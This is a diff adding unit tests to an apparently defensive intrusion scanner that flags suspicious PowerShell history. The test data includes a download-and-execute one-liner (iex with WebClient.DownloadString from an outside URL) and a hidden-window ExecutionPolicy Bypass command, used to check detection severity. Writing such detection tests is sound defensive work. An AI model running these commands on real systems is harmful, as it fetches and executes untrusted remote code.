@@ -44,3 +44,19 @@ class IntrusionHistoryTests(unittest.TestCase):
     def test_original_unrecognized_webclient_command_stays_high(self):
         line = "iex ((New-Object Net.WebClient).DownloadString('https://get.activated.win'))"
         self.assertEqual(intrusion._history_findings({'psHistory':[line]})[0]['severity'], 'high')
+
+    def test_bypass_file_of_a_local_script_is_not_flagged(self):
+        # JARVIS's own repair scripts are invoked exactly this way; the flag
+        # says nothing about where the target file came from.
+        line = (r'powershell -NoProfile -ExecutionPolicy Bypass -File '
+                r'"$src\scripts\repair\apply-jarvis-sysmon-policy.ps1" '
+                r'-PolicyPath "$src\windows-sysmon\jarvis-windows-baseline.xml"')
+        self.assertFalse(intrusion.SUSPICIOUS_HISTORY.search(line))
+        out = intrusion._history_findings({'psHistory': [line]})
+        self.assertEqual(out[0]['title'], 'PowerShell history clean')
+
+    def test_bypass_command_the_actual_paste_and_run_vector_still_matches(self):
+        line = 'powershell -w hidden -ExecutionPolicy Bypass -Command "whoami"'
+        self.assertTrue(intrusion.SUSPICIOUS_HISTORY.search(line))
+        out = intrusion._history_findings({'psHistory': [line]})
+        self.assertEqual(out[0]['severity'], 'high')
